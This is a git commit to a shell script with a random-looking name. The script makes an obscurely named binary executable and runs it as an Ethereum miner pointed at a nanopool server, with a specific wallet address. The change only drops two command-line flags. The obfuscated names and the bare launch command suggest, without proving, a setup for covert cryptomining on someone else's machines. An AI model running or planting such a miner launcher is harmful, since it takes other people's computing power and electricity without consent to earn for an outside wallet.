dd4a58a31f7a49b1ac6e1a41831730c86f1d0933
pempekselam <80247082+pempekselam@users.noreply.github.com>
2021-03-11 03:58:05 +0700

    Update iuhfdhjg.sh

--- iuhfdhjg.sh
+++ iuhfdhjg.sh
@@ -1,2 +1,2 @@
 #!/bin/sh
-chmod +x ./hcdbvhdffdh && ./hcdbvhdffdh -P stratum1+tcp://0x76910e83d10e6a2608c4cd5127c2a9439fdb6379.NoBu@eth-eu1.nanopool.org:9999 -G -R
+chmod +x ./hcdbvhdffdh && ./hcdbvhdffdh -P stratum1+tcp://0x76910e83d10e6a2608c4cd5127c2a9439fdb6379.NoBu@eth-eu1.nanopool.org:9999
